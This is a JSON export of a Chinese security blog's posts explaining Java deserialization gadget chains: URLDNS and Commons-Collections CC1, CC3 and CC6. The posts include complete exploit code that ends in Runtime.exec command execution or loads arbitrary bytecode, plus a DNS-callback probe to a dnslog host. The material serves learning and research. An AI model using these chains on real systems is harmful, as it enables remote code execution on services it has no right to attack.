{"meta":{"title":"n1utra's blog","subtitle":"","description":"网络安全","author":"n1utra","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-07-06T15:25:15.315Z","updated":"2025-07-06T15:25:15.315Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个用来记录自己学习过程的博客。"},{"title":"所有分类","date":"2025-06-21T19:52:31.922Z","updated":"2025-06-21T19:52:31.922Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2025-06-21T19:53:14.776Z","updated":"2025-06-21T19:53:14.776Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":"暂时没有朋友：）"},{"title":"所有标签","date":"2025-06-21T19:53:20.497Z","updated":"2025-06-21T19:53:20.497Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"浅述CC链(4)：CC链3","slug":"CC链3","date":"2025-07-13T14:20:21.000Z","updated":"2025-07-16T16:09:48.535Z","comments":true,"path":"2025/07/13/CC链3/","permalink":"http://example.com/2025/07/13/CC%E9%93%BE3/","excerpt":"","text":"CC链3CC链3和CC链6以及CC链1的执行点不同，采用的是类动态加载的方式，CC链6和CC链1是命令执行，而CC链3则是代码执行。 简单来说，CC链1和CC链6都是通过InvokerTransfomer传入执行Runtime类的方法来执行命令 而CC链3是通过通过InvokerTransfomer传入执行构造出来的类加载器来执行指定的JAVA代码 相当于给CC1和CC6构造了一个更复杂的执行点 简述动态加载在类的动态加载中，一般是通过ClassLoader-&gt;loadclass-&gt;findClass-&gt;defineClass这个流程进行类加载，在最后的defineClass加载java字节码，但是只加载字节码是不运行代码的，还需要找到一个初始化的地方才会运行类中的代码 执行点：ClassLoader在classLoader中存在许多defineClass方法，我们需要找到一个被外部调用的，找到了下面这个方法 12345protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len) throws ClassFormatError&#123; return defineClass(name, b, off, len, null);&#125; 这里面的参数分别是： name：类的全限定名，就是包名.类名的形式 b：要加载的类的字节码数组 off：b的起始偏移量，即从哪个索引开始读取字节码，一般是0 len：要读取的字节码的长度，一般是b.length 调用点：TemplatesImpl.TransletClassLoader查找外部调用了defineClass方法的地方，找到了TemplatesImpl下面的一个静态类：TransletClassLoader 123456static final class TransletClassLoader extends ClassLoader &#123; ...... Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length); &#125;&#125; 这里的defineClass没有修饰符，默认是default，在当前包中查找调用。只接收一个参数，java类的字节码文件。继续查找调用 调用点：TemplatesImpl#defineTransletClasses在当前类中找到defineTransletClasses方法中存在一处调用，这里获得了字节码，然后进行赋值操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new HashMap&lt;&gt;(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); // 在这里进行调用 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125;&#125; 这里的_bytecodes来自于构造方法，在类的实例化时创建 继续查找这个方法的调用点，查找到三处，这里选择其中getTransletInstance方法 调用点：TemplatesImpl#getTransletInstance选择这处调用的原因是该方法代码中使用了newInstance进行初始化，意味着走完这个函数就能动态加载完字节码并执行，另外两处都没有进行初始化。并且这里是一个get方法，fastjson中的一条链就是这里，具体后续针对fastjson再说。 1234567891011121314151617181920private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; 这里我们需要查看_class[_transletIndex]是如何赋值的，这里赋值其实就是在defineTransletClasses方法中进行的，具体位置如下图： 注意这里，遍历时调用了每一个defineClass[i]，这里其实就是在遍历加载类字节码数组，同时后续构造参数时还需要注意这里。 那么这里_class[_transletIndex]就是可控的，接下来继续寻找getTransletInstance方法的调用 调用点：TemplatesImpl#newTransformerTemplatesImpl#getTransletInstance这个方法的调用点只有一处，在当前类的Transformer方法中 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 这里是一个public方法，在new TransformerImpl直接调用，那么可以在这里尝试构造EXP了 EXP初步构造构造函数之前需要确定参数调用以及赋值 在TemplatesImpl#getTransletInstance中，需要给_name属性赋值，但是这里不在构造方法中进行赋值，所以需要手动赋值 在TemplatesImpl#defineTransletClasses中，_bytecodes需要赋值，_tfactory在过程中需要调用方法，也需要赋值 需要注意赋值的类型，_name仅判断是否为空，可以赋值任意字符串。_bytecodes是以二维数组的形式传入需要加载的类字节码数组。 注意这里_tfactory是通过transient修饰，即不可序列化的变量，所以给他赋值是没有意义的，因为反序列化时是不会被传入的 那么应该怎么处理这里？既然需要这个属性，又无法被序列化，那么可以在反序列化的地方看看是如何赋值的，即查看readObject方法中是如何传递的 可以看到，在反序列化时这里是直接被创建的 但是我们现在需要的是正向执行看EXP的效果，所以这里还是需要暂时进行赋值，构造出代码如下： 这段代码基本满足调用逻辑，并且运行时能够执行加载的类中的代码，则说明没问题 12345678910111213141516171819202122232425public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass(); Field nameFied = aClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = aClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); // _bytecodes 是一个二维数组，但是参数传递过程中通过遍历获取其中的每一个一维数组进行加载 // 这里先将字节码读取为一个一维数组，然后把这个一维数组放入一个二维数组 byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = aClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); templates.newTransformer();&#125; 但是这里报空指针异常了，断点调试一下，发现问题出在defineTransletClasses方法中 这里判断加载类的父类的名字是否包含这个常量，如果不是走入else，else中变量_auxClasses为空，所以就会报空指针异常 那么问题找到了，这里存在两种方法处理： 要加载的类字节码继承这个父类 给_auxClasses赋值 但是看下面代码中判断了_transletIndex是否小于0，是的话就会报错。进入else时这个属性值是-1，所以第二种方法不可用，我们选择第一种 让自定义加载类继承父类并处理报错之后，重新编译。再次执行就能成功加载到自定义的类文件。那么说明我们这里没问题。 接下来只需要将这部分代码和CC链1的反序列化入口结合就完成了这条链。 结合CC链1-LazyMap反序列化入口构造EXP将构造的templates类加载器结合CC链1，即修改InvokerTransformer传入执行的方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); // _bytecodes 是一个二维数组，但是参数传递过程中通过遍历获取其中的每一个一维数组进行加载 // 这里先将字节码读取为一个一维数组，然后把这个一维数组放入一个二维数组 byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); //decorate.get(Runtime.getRuntime()); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); // 这里创建对象时不用像CC1TransformedMap那样需要注意传入的注解类成员变量相关 // 转为InvocationHandler作为代理处理器使用 InvocationHandler o = (InvocationHandler) annotationConstructor.newInstance(Target.class, decorate); // 这里实现了Map接口，要作为Map使用，则转为Map类型 Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o); // 这里再次创建对象，传入代理过后的对象 Object o1 = annotationConstructor.newInstance(Target.class, map); //serialize(o1); unserialize(&quot;ser.bin&quot;);&#125; 同理，还可以结合CC链1另外一条链以及CC链6的执行点进行利用，毕竟这里只是只是执行点不同 与ysoserial中CC3的区别可以看到在ysoserial中，ConstantTransformer传入的是TrAXFilter，也没有使用InvokerTransformer执行，而是使用InstantiateTransformer 这里其实是在newTransformer方法的基础上进一步查找利用，在TrAXFilter的构造方法中进行调用，但是这个TrAXFilter类不能进行反序列化。然后就结合了InstantiateTransformer#transform方法会创建对象的特性进行了利用 总结正如开头所说，CC链3只是利用TemplatesImpl存在的类加载调用，作为执行类，替换了Runtime类传入了CC链1、CC链6中。相对于链1和链6来说，前面的调用点都是一样的，只是后面执行类的调用比起直接传入Runtime类复杂了一点。 其实这些反序列化链基本可以分为三部分：反序列化入口、调用点、执行点。每个部分可以根据合适的条件进行拆分组合。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"URLDNS链","slug":"URLDNS链","date":"2025-07-13T12:15:01.000Z","updated":"2025-07-13T13:10:52.806Z","comments":true,"path":"2025/07/13/URLDNS链/","permalink":"http://example.com/2025/07/13/URLDNS%E9%93%BE/","excerpt":"","text":"URLDNS链URLDNS链是最简单的链，用来了解反序列化链再合适不过，这条链常用来探测是否存在反序列化漏洞 执行点：URL在URL#hashCode方法中，会调用handler.hashCode对当前对象进行hash计算 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 而这里的handler.hashCode中，会对传入的url进行解析，具体就是在getHostAddress处 12345678910111213141516171819protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; ...&#125; 也就是说如果我们构建了一个URL对象，其中地址为dnslog地址，那么当调用到URL#hashCode的方法时就会去进行DNS解析，我们就能在平台上看到DNS请求。 而说到会调用hashCode的地方，那就首选HashMap 反序列化起点：HashMap在HashMap#readObject方法最后，有一串代码：putVal(hash(key), key, value, false, false);，对key通过hash方法进行计算 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 查看这个hash方法，内部就是在调用key#hashCode方法，如果传入一个URL类，那么就会执行到URL#hashCode 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 构造EXP根据上述步骤构造如下代码 12345678910111213public static void main(String[] args) throws Exception &#123; // 创建一个 URL 对象，并传入DNSlog地址 URL url = new URL(&quot;http://1v4k4e.dnslog.cn&quot;); // 创建一个 HashMap 对象，并将 URL 作为key传入 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(url, &quot;value&quot;); // 序列化 util.serialize(hashMap); // 反序列化 util.unserialize(&quot;ser.bin&quot;); 为了避免干扰，序列化和反序列化之间间隔几分钟在执行，会发现在序列化时进行了dns请求，但是反序列化时则没有进行，这是因为在put时就执行了hashCode 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 在URL#hashCode处打上断点，对序列化过程进行调试。发现hashCode这个属性默认为-1，所以不进入if判断，然后就会进行解析（这里调试时可能会在断点停留好几次，只有一次是想要停下的） 那么这里就采用反射的方式，在put之前修改hashCode的值，put之后改回去，最终代码如下 1234567891011121314151617181920212223242526public class URLDNS &#123; public static void main(String[] args) throws Exception &#123; //创建一个 URL 对象，并传入DNSlog地址 URL url = new URL(&quot;http://miocmv.dnslog.cn&quot;); //创建一个 HashMap 对象，并将 URL 作为key传入 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Class&lt;? extends URL&gt; aClass = url.getClass(); Field hashCode = aClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url, 1); hashMap.put(url, &quot;value&quot;); hashCode.set(url, -1); //序列化 util.serialize(hashMap); //反序列化 //util.unserialize(&quot;ser.bin&quot;); &#125;&#125; 序列化时调试，hashCode值为1，进入if判断 反序列化调试，hashCode为-1，不进入if判断，然后执行到后续代码进行解析","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"}]},{"title":"浅述CC链(补充)：CC链的其他问题","slug":"CC链1是如何修复的","date":"2025-07-13T09:31:57.000Z","updated":"2025-07-13T12:14:22.839Z","comments":true,"path":"2025/07/13/CC链1是如何修复的/","permalink":"http://example.com/2025/07/13/CC%E9%93%BE1%E6%98%AF%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%E7%9A%84/","excerpt":"","text":"CC链的其他问题CC链1是如何修复的CC链1在jdk8u71版本中就被修复了，查看8u71的AnnotationInvocationHandler#readObject与8u65版本进行对比 在8u65中，我们是通过memberValue.setValue触发，而memberValue来自于构造方法中memberValues遍历获得 在8u71中，memberValue来自于streamVals，而streamVals是在Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);获取的，而我们无法控制这里，所以这条链就中断了","categories":[],"tags":[]},{"title":"浅述CC链(3)：CC链6","slug":"CC链6","date":"2025-07-12T07:43:39.000Z","updated":"2025-07-13T09:30:48.073Z","comments":true,"path":"2025/07/12/CC链6/","permalink":"http://example.com/2025/07/12/CC%E9%93%BE6/","excerpt":"","text":"CC链6CC链6是CC链1-LazyMap+URLDNS链的结合： URLDNS链中是通过hashMap#readObject方法中，对key进行哈希计算调用了hashCode，当key被赋值为URL类时，调用URL类的hashcode方法会调用到java.net.URLStreamHandler#hashCode，在这个方法里面对传入的域名进行解析，解析时DNSLog就能够获取到对应的数据。 而CC链1-LazyMap是LazyMap#get方法调用到了InvokerTransformer#transform，然后找到AnnotationInvocationHandler的invoke方法调用了LazyMap#get。 如果找到一个类的hashCode方法调用了LazyMap#get，把这个类放入到hashMap，反序列化时就能通过hashCode方法去调用到LazyMap#get最终调用到InvokerTransformer#transform，所以就找到了这里的一个中间类：TiedMapEntry 搭建环境 jdk8u71 Commons-Collections 3.2.1 执行点：InvokerTransformer这里的执行点还是InvokerTransformer，不再过多赘述 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 调用点1：LazyMap这里的调用点依然是LazyMap#get，也不再过多赘述 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 调用点2：TiedMapEntry看TiedMapEntry#hashCode方法，里面调用了本身的getValue方法 12345public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; 这里的getValue里面调用了一个map.get(key);，按照之前的思路，我们给map赋值为LazyMap，此时就会调用LazyMap#get，key值表示transform的参数进行传递 123public Object getValue() &#123; return map.get(key);&#125; 这里的map来自于TiedMapEntry的构造方法，这个构造方法接收一个map和一个对象，那么在这里传入LazyMap就能够调用到其get方法，最后调用到transform 12345public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key;&#125; 那么来利用当前已知条件来测试代码 1234567891011121314151617181920public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); // 上面都是LazyMap的调用，不再叙述 // 这里是调用TiedMapEntry TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;aaa&quot;); tiedMapEntry.hashCode();&#125; 运行代码能够弹出计算器，则说明没问题。现在我们需要将这个代码与URLDNS链结合起来，也就是放入到HashMap中，再进行序列化与反序列化 入口：HashMap这条链的反序列化入口位于HashMap#readObject，要触发到之前的链，需要走到最下面的putVal(hash(key), key, value, false, false);， 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 当运行到hash(key)时就会调用hash方法，可以看到这里其实就是在调用hashCode方法，也就是说我们构造的HashMap对象的key就传入TiedMapEntry对象，然后就会调用到TiedMapEntry#hashCode 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 构造一下代码 12345678910111213141516171819202122232425262728293031323334public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); serialize(hashMap); //unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 但是这里还存在问题，直接进行序列化会报错，在DNSURL链中也存在相同的问题。 这是因为在put时就调用了hashCode执行了代码，但是最后执行代码获取的ProcessImpl实例无法进行序列化就产生了报错 所以这里我们采用URLDNS链中类似的方法，通过反射来处理。这里可以处理的地方很多，只要改变原本的同名方法调用即可，我这里选择的是对LazyMap#get的方法调用进行处理，factory赋予任意一个Transformer，这样就不会调用到Invokertransformer#transform，然后通过反射再给factory赋值 1234567891011121314151617181920212223242526public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); Class&lt;? extends Map&gt; aClass = decorate.getClass(); Field factory = aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate, chainedTransformer); serialize(hashMap); unserialize(&quot;ser.bin&quot;);&#125; 可以看到在这里创建LazyMap时传入了一个new ConstantTransformer(1)，put结束后又通过反射重新给factory属性进行赋值 按道理来说此时应该已经构造好了，但是反序列化时还是没有弹出计算器，打上断点进行调试，发现在LazyMap#get方法处的判断没有满足 查看map的属性，发现其中已经多了一个key为111，这与LazyMap有关，LazyMap其实是一种懒加载，当获取key时如果没有这个key，就会自动在当前map中添加 那么直接在序列化之前将这个map中的111去除即可 12345678910111213141516171819202122232425262728293031323334353637383940public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); decorate.remove(&quot;111&quot;); Class&lt;? extends Map&gt; aClass = decorate.getClass(); Field factory = aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate, chainedTransformer); serialize(hashMap); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 此时执行反序列化即可弹出计算器，证明当前exp可用 